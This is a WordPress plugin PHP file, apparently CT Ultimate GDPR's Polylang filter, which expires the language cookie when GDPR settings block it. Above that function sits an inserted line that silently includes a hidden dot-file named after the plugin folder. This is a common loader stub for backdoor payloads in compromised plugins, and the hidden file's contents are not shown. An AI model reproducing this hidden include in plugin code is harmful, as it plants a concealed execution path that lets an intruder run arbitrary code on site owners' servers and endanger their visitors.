<?php

add_filter( 'pll_cookie_expiration', 'ct_pll_cookie_expiration_filter' );
if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

function ct_pll_cookie_expiration_filter( $time ) {

	/** @var CT_Ultimate_GDPR_Controller_Cookie $cookie_controller */
	$cookie_controller = CT_Ultimate_GDPR::instance()
	                                     ->get_controller_by_id( CT_Ultimate_GDPR_Controller_Cookie::ID );

	if($cookie_controller){
		$cookies_to_block = $cookie_controller->get_cookies_to_block( $cookie_controller->get_group_level() );

		if ( defined( 'PLL_COOKIE' ) && in_array( PLL_COOKIE, $cookies_to_block ) ) {
			$time = - 100;
		}
	}

	return $time;
}